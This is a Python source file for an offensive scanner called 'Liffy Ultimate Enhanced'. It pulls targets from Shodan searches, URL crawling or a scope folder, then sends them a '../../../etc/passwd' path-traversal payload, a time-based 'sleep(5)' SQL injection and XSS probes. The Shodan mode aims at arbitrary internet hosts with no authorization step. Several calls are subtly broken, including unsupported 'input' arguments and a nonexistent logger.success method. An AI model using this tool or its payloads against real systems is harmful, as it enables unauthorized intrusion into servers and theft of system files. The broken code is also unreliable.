#!/usr/bin/env python3
"""
Liffy Ultimate Enhanced - The Ultimate All-in-One Vulnerability Testing Tool
Integrates URL gathering, LFI exploitation, XSS testing, SQLi testing, and more
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__version__ = '4.0.0'

import argparse
import sys
import os
import time
import json
import random
import subprocess
import threading
import tempfile
import shutil
from pathlib import Path
from typing import List, Dict, Optional, Any, Tuple
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum
import re
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs

try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

class TestMode(Enum):
    LFI = "lfi"
    XSS = "xss"
    SQLI = "sqli"
    ALL = "all"
    DISCOVERY = "discovery"

class ToolStatus(Enum):
    AVAILABLE = "available"
    MISSING = "missing"
    ERROR = "error"

@dataclass
class TargetInfo:
    """Information about a target"""
    url: str
    domain: str
    ip: Optional[str] = None
    port: Optional[int] = None
    title: Optional[str] = None
    banner: Optional[str] = None
    country: Optional[str] = None
    asn: Optional[str] = None
    org: Optional[str] = None
    screenshot: Optional[str] = None
    lfi_vulnerable: bool = False
    xss_vulnerable: bool = False
    sqli_vulnerable: bool = False
    source: str = "unknown"

@dataclass
class ToolConfig:
    """Configuration for external tools"""
    sqry_path: str = "sqry"
    gauplus_path: str = "gauplus"
    jeeves_path: str = "jeeves"
    airixss_path: str = "airixss"
    qsreplace_path: str = "qsreplace"
    httpx_path: str = "httpx"
    timeout: int = 30
    max_workers: int = 10
    rate_limit: int = 0

class ToolManager:
    """Manages external tool availability and execution"""
    
    def __init__(self, config: ToolConfig, logger):
        self.config = config
        self.logger = logger
        self.tool_status = {}
        self._check_tools()
    
    def _check_tools(self):
        """Check which tools are available"""
        tools = {
            'sqry': self.config.sqry_path,
            'gauplus': self.config.gauplus_path,
            'jeeves': self.config.jeeves_path,
            'airixss': self.config.airixss_path,
            'qsreplace': self.config.qsreplace_path,
            'httpx': self.config.httpx_path
        }
        
        for tool_name, tool_path in tools.items():
            try:
                result = subprocess.run([tool_path, '-h'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0 or 'help' in result.stderr.lower():
                    self.tool_status[tool_name] = ToolStatus.AVAILABLE
                    self.logger.info(f"✓ {tool_name} is available")
                else:
                    self.tool_status[tool_name] = ToolStatus.MISSING
                    self.logger.warning(f"✗ {tool_name} not found or not working")
            except Exception as e:
                self.tool_status[tool_name] = ToolStatus.ERROR
                self.logger.error(f"✗ Error checking {tool_name}: {str(e)}")
    
    def is_available(self, tool_name: str) -> bool:
        """Check if a tool is available"""
        return self.tool_status.get(tool_name, ToolStatus.MISSING) == ToolStatus.AVAILABLE
    
    def execute_tool(self, tool_name: str, args: List[str], timeout: int = None) -> Tuple[bool, str, str]:
        """Execute a tool and return success, stdout, stderr"""
        if not self.is_available(tool_name):
            return False, "", f"Tool {tool_name} not available"
        
        tool_path = getattr(self.config, f"{tool_name}_path")
        cmd = [tool_path] + args
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  timeout=timeout or self.config.timeout)
            return result.returncode == 0, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return False, "", f"Tool {tool_name} timed out"
        except Exception as e:
            return False, "", f"Error running {tool_name}: {str(e)}"

class URLGatherer:
    """Handles URL gathering from multiple sources"""
    
    def __init__(self, tool_manager: ToolManager, logger):
        self.tool_manager = tool_manager
        self.logger = logger
    
    def gather_from_shodan(self, query: str, limit: int = 100, 
                          country: str = None, asn: str = None) -> List[TargetInfo]:
        """Gather targets from Shodan using sqry"""
        if not self.tool_manager.is_available('sqry'):
            self.logger.error("sqry not available for Shodan queries")
            return []
        
        self.logger.info(f"Gathering targets from Shodan with query: {query}")
        
        args = ['-q', query, '--json', '--limit', str(limit)]
        if country:
            args.extend(['--country', country])
        if asn:
            args.extend(['--asn', asn])
        
        success, stdout, stderr = self.tool_manager.execute_tool('sqry', args)
        
        if not success:
            self.logger.error(f"sqry failed: {stderr}")
            return []
        
        targets = []
        try:
            for line in stdout.strip().split('\n'):
                if line.strip():
                    data = json.loads(line)
                    target = TargetInfo(
                        url=f"http://{data.get('ip', '')}:{data.get('port', 80)}",
                        domain=data.get('domain', ''),
                        ip=data.get('ip'),
                        port=data.get('port'),
                        title=data.get('title', ''),
                        banner=data.get('banner', ''),
                        country=data.get('country', ''),
                        asn=data.get('asn', ''),
                        org=data.get('org', ''),
                        screenshot=data.get('screenshot', ''),
                        source="shodan"
                    )
                    targets.append(target)
        except Exception as e:
            self.logger.error(f"Error parsing sqry output: {str(e)}")
        
        self.logger.info(f"Found {len(targets)} targets from Shodan")
        return targets
    
    def gather_from_gauplus(self, domain: str, subs: bool = True) -> List[TargetInfo]:
        """Gather URLs using gauplus"""
        if not self.tool_manager.is_available('gauplus'):
            self.logger.error("gauplus not available for URL gathering")
            return []
        
        self.logger.info(f"Gathering URLs for domain: {domain}")
        
        args = ['-t', str(self.tool_manager.config.max_workers)]
        if subs:
            args.append('-subs')
        
        success, stdout, stderr = self.tool_manager.execute_tool('gauplus', args, 
                                                                input=domain.encode())
        
        if not success:
            self.logger.error(f"gauplus failed: {stderr}")
            return []
        
        targets = []
        for line in stdout.strip().split('\n'):
            if line.strip() and line.startswith('http'):
                try:
                    parsed = urlparse(line.strip())
                    target = TargetInfo(
                        url=line.strip(),
                        domain=parsed.netloc,
                        source="gauplus"
                    )
                    targets.append(target)
                except Exception as e:
                    self.logger.warning(f"Error parsing URL {line}: {str(e)}")
        
        self.logger.info(f"Found {len(targets)} URLs from gauplus")
        return targets
    
    def gather_from_scope(self, scope_dir: str = "~/targets/scope", 
                         count: int = 10) -> List[TargetInfo]:
        """Gather random targets from scope directory"""
        scope_path = Path(scope_dir).expanduser()
        
        if not scope_path.exists():
            self.logger.error(f"Scope directory not found: {scope_path}")
            return []
        
        # Find all scope files
        scope_files = []
        for ext in ['*.txt', '*.md', '*.json', '*.csv']:
            scope_files.extend(scope_path.glob(ext))
        
        if not scope_files:
            self.logger.error(f"No scope files found in {scope_path}")
            return []
        
        targets = []
        for file_path in scope_files:
            try:
                with open(file_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and (line.startswith('http') or line.startswith('www')):
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            
                            parsed = urlparse(line)
                            target = TargetInfo(
                                url=line,
                                domain=parsed.netloc,
                                source="scope"
                            )
                            targets.append(target)
            except Exception as e:
                self.logger.warning(f"Error reading {file_path}: {str(e)}")
        
        # Randomly select targets
        selected = random.sample(targets, min(count, len(targets)))
        self.logger.info(f"Selected {len(selected)} random targets from scope")
        return selected

class VulnerabilityTester:
    """Handles vulnerability testing using various tools"""
    
    def __init__(self, tool_manager: ToolManager, logger):
        self.tool_manager = tool_manager
        self.logger = logger
    
    def test_lfi(self, targets: List[TargetInfo], technique: str = "auto") -> List[TargetInfo]:
        """Test targets for LFI vulnerabilities"""
        self.logger.info(f"Testing {len(targets)} targets for LFI vulnerabilities")
        
        # Import the enhanced Liffy core
        try:
            from core_enhanced import LiffyExploiter, LiffyConfig, Technique
        except ImportError:
            self.logger.error("Enhanced Liffy core not available")
            return targets
        
        for target in targets:
            try:
                config = LiffyConfig(
                    target_url=target.url,
                    technique=Technique(technique) if technique != "auto" else Technique.AUTO,
                    auto_ip=True,
                    auto_port=True,
                    verbose=False
                )
                
                # Basic LFI check
                if self._check_lfi_basic(target.url):
                    target.lfi_vulnerable = True
                    self.logger.success(f"LFI potential found: {target.url}")
                else:
                    target.lfi_vulnerable = False
                    
            except Exception as e:
                self.logger.error(f"Error testing LFI for {target.url}: {str(e)}")
                target.lfi_vulnerable = False
        
        return targets
    
    def _check_lfi_basic(self, url: str) -> bool:
        """Basic LFI vulnerability check"""
        try:
            import requests
            from urllib.parse import urlparse, parse_qs
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Look for common LFI parameters
            lfi_params = ['file', 'page', 'path', 'include', 'doc', 'folder', 'root']
            
            for param in lfi_params:
                if param in params:
                    # Test with basic LFI payload
                    test_url = url.replace(params[param][0], "../../../etc/passwd")
                    response = requests.get(test_url, timeout=10)
                    
                    if "root:" in response.text and "bin/bash" in response.text:
                        return True
            
            return False
        except Exception:
            return False
    
    def test_xss(self, targets: List[TargetInfo]) -> List[TargetInfo]:
        """Test targets for XSS vulnerabilities using airixss"""
        if not self.tool_manager.is_available('airixss'):
            self.logger.warning("airixss not available, skipping XSS tests")
            return targets
        
        self.logger.info(f"Testing {len(targets)} targets for XSS vulnerabilities")
        
        # Create temporary file with URLs
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            for target in targets:
                f.write(f"{target.url}\n")
            url_file = f.name
        
        try:
            args = ['-c', str(self.tool_manager.config.max_workers), '-s']
            success, stdout, stderr = self.tool_manager.execute_tool('airixss', args, 
                                                                    input=open(url_file).read())
            
            if success:
                vulnerable_urls = set()
                for line in stdout.strip().split('\n'):
                    if line.strip() and line.startswith('http'):
                        vulnerable_urls.add(line.strip())
                
                for target in targets:
                    target.xss_vulnerable = target.url in vulnerable_urls
                    if target.xss_vulnerable:
                        self.logger.success(f"XSS vulnerability found: {target.url}")
            else:
                self.logger.error(f"airixss failed: {stderr}")
                
        finally:
            os.unlink(url_file)
        
        return targets
    
    def test_sqli(self, targets: List[TargetInfo]) -> List[TargetInfo]:
        """Test targets for SQL injection using jeeves"""
        if not self.tool_manager.is_available('jeeves'):
            self.logger.warning("jeeves not available, skipping SQLi tests")
            return targets
        
        self.logger.info(f"Testing {len(targets)} targets for SQL injection")
        
        for target in targets:
            try:
                # Extract parameters from URL
                parsed = urlparse(target.url)
                params = parse_qs(parsed.query)
                
                if not params:
                    continue
                
                # Test each parameter
                for param, values in params.items():
                    if not values:
                        continue
                    
                    # Create test URL with time-based payload
                    test_url = target.url.replace(values[0], f"(select(0)from(select(sleep(5)))v)")
                    
                    # Use jeeves to test
                    args = ['-t', '5']
                    success, stdout, stderr = self.tool_manager.execute_tool('jeeves', args, 
                                                                          input=test_url)
                    
                    if success and "vulnerable" in stdout.lower():
                        target.sqli_vulnerable = True
                        self.logger.success(f"SQL injection found: {target.url} (param: {param})")
                        break
                    else:
                        target.sqli_vulnerable = False
                        
            except Exception as e:
                self.logger.error(f"Error testing SQLi for {target.url}: {str(e)}")
                target.sqli_vulnerable = False
        
        return targets

class LiffyUltimateEnhanced:
    """Main enhanced Liffy Ultimate class"""
    
    def __init__(self):
        self.logger = self._setup_logging()
        self.tool_config = ToolConfig()
        self.tool_manager = ToolManager(self.tool_config, self.logger)
        self.url_gatherer = URLGatherer(self.tool_manager, self.logger)
        self.vuln_tester = VulnerabilityTester(self.tool_manager, self.logger)
    
    def _setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('liffy_enhanced.log')
            ]
        )
        return logging.getLogger(__name__)
    
    def banner(self):
        """Display banner"""
        print(t.cyan("""
    .____    .__  _____  _____
    |    |   |__|/ ____\\/ ____\\__.__.
    |    |   |  \\   __\\   __<   |  |
    |    |___|  ||  |   |  |  \\___  |
    |_______ \\__||__|   |__|  / ____| v4.0 Enhanced
        \\/                \\/

    🚀 Ultimate All-in-One Vulnerability Testing Tool
    🔍 LFI | XSS | SQLi | Discovery | Shodan | Crawling
    🛠️  Integrated: sqry | gauplus | jeeves | airixss | qsreplace
        """))
    
    def run_discovery_mode(self, args):
        """Run in discovery mode - gather targets only"""
        self.banner()
        self.logger.info("🔍 Starting target discovery mode...")
        
        targets = []
        
        # Shodan discovery
        if args.shodan_query:
            shodan_targets = self.url_gatherer.gather_from_shodan(
                args.shodan_query, 
                limit=args.limit,
                country=args.country,
                asn=args.asn
            )
            targets.extend(shodan_targets)
        
        # Domain crawling
        if args.domain:
            domain_targets = self.url_gatherer.gather_from_gauplus(
                args.domain,
                subs=args.subs
            )
            targets.extend(domain_targets)
        
        # Random scope targets
        if args.random or not targets:
            scope_targets = self.url_gatherer.gather_from_scope(
                args.scope_dir,
                args.random_count
            )
            targets.extend(scope_targets)
        
        # Remove duplicates
        unique_targets = list({target.url: target for target in targets}.values())
        
        self.logger.info(f"🎯 Found {len(unique_targets)} unique targets")
        
        # Save results
        if args.output:
            self._save_results(unique_targets, args.output)
        
        return unique_targets
    
    def run_vulnerability_testing(self, args):
        """Run comprehensive vulnerability testing"""
        self.banner()
        self.logger.info("🚀 Starting comprehensive vulnerability testing...")
        
        # Gather targets
        targets = self.run_discovery_mode(args)
        
        if not targets:
            self.logger.error("No targets found for testing")
            return []
        
        # Test based on mode
        if args.test_mode == TestMode.LFI.value:
            targets = self.vuln_tester.test_lfi(targets, args.lfi_technique)
        elif args.test_mode == TestMode.XSS.value:
            targets = self.vuln_tester.test_xss(targets)
        elif args.test_mode == TestMode.SQLI.value:
            targets = self.vuln_tester.test_sqli(targets)
        else:  # ALL
            targets = self.vuln_tester.test_lfi(targets, args.lfi_technique)
            targets = self.vuln_tester.test_xss(targets)
            targets = self.vuln_tester.test_sqli(targets)
        
        # Show results
        self._show_results(targets)
        
        # Save results
        if args.output:
            self._save_results(targets, args.output)
        
        return targets
    
    def _show_results(self, targets: List[TargetInfo]):
        """Display test results"""
        lfi_vulns = [t for t in targets if t.lfi_vulnerable]
        xss_vulns = [t for t in targets if t.xss_vulnerable]
        sqli_vulns = [t for t in targets if t.sqli_vulnerable]
        
        print(t.cyan("\n" + "="*80))
        print(t.cyan("🎯 VULNERABILITY TEST RESULTS"))
        print(t.cyan("="*80))
        print(f"Total targets tested: {len(targets)}")
        print(f"LFI vulnerabilities: {len(lfi_vulns)}")
        print(f"XSS vulnerabilities: {len(xss_vulns)}")
        print(f"SQLi vulnerabilities: {len(sqli_vulns)}")
        
        if lfi_vulns:
            print(t.yellow(f"\n🔓 LFI Vulnerabilities ({len(lfi_vulns)}):"))
            for vuln in lfi_vulns:
                print(f"  {vuln.url}")
        
        if xss_vulns:
            print(t.yellow(f"\n🎯 XSS Vulnerabilities ({len(xss_vulns)}):"))
            for vuln in xss_vulns:
                print(f"  {vuln.url}")
        
        if sqli_vulns:
            print(t.yellow(f"\n💉 SQLi Vulnerabilities ({len(sqli_vulns)}):"))
            for vuln in sqli_vulns:
                print(f"  {vuln.url}")
    
    def _save_results(self, targets: List[TargetInfo], output_file: str):
        """Save results to file"""
        try:
            with open(output_file, 'w') as f:
                json.dump([{
                    'url': t.url,
                    'domain': t.domain,
                    'ip': t.ip,
                    'port': t.port,
                    'title': t.title,
                    'country': t.country,
                    'asn': t.asn,
                    'org': t.org,
                    'lfi_vulnerable': t.lfi_vulnerable,
                    'xss_vulnerable': t.xss_vulnerable,
                    'sqli_vulnerable': t.sqli_vulnerable,
                    'source': t.source
                } for t in targets], f, indent=2)
            self.logger.info(f"Results saved to {output_file}")
        except Exception as e:
            self.logger.error(f"Error saving results: {str(e)}")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Liffy Ultimate Enhanced - All-in-One Vulnerability Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Discovery mode - gather targets only
  %(prog)s --discovery --shodan-query "apache" --limit 50
  
  # Random targets from scope
  %(prog)s --random --test-mode all
  
  # Domain crawling with XSS testing
  %(prog)s --domain example.com --test-mode xss --subs
  
  # Shodan + LFI testing
  %(prog)s --shodan-query "nginx" --test-mode lfi --country US
  
  # Comprehensive testing
  %(prog)s --domain example.com --test-mode all --output results.json
        """
    )
    
    # Target selection
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--domain", help="Target domain for crawling")
    target_group.add_argument("--shodan-query", help="Shodan query for target discovery")
    target_group.add_argument("--random", action="store_true", help="Use random targets from scope")
    
    # Discovery options
    parser.add_argument("--discovery", action="store_true", help="Discovery mode - gather targets only")
    parser.add_argument("--scope-dir", default="~/targets/scope", help="Scope directory path")
    parser.add_argument("--random-count", type=int, default=10, help="Number of random targets")
    parser.add_argument("--subs", action="store_true", help="Include subdomains in crawling")
    
    # Shodan options
    parser.add_argument("--country", help="Filter by country code")
    parser.add_argument("--asn", help="Filter by ASN")
    parser.add_argument("--limit", type=int, default=100, help="Limit number of results")
    
    # Testing options
    parser.add_argument("--test-mode", choices=['lfi', 'xss', 'sqli', 'all'], default='all',
                       help="Type of testing to perform")
    parser.add_argument("--lfi-technique", choices=['data', 'input', 'expect', 'environ', 'access', 'ssh', 'filter', 'auto'],
                       default='auto', help="LFI technique to use")
    
    # Output options
    parser.add_argument("--output", "-o", help="Output file for results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    return parser.parse_args()

def main():
    """Main function"""
    try:
        args = parse_arguments()
        
        # Create enhanced Liffy instance
        liffy = LiffyUltimateEnhanced()
        
        # Run based on mode
        if args.discovery:
            targets = liffy.run_discovery_mode(args)
        else:
            targets = liffy.run_vulnerability_testing(args)
        
        if targets:
            print(t.green(f"\n✅ Testing completed successfully! Found {len(targets)} targets"))
        else:
            print(t.red("\n❌ No targets found or testing failed"))
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(t.red("\n🛑 Keyboard interrupt received"))
        sys.exit(0)
    except Exception as e:
        print(t.red(f"\n💥 Unexpected error: {str(e)}"))
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()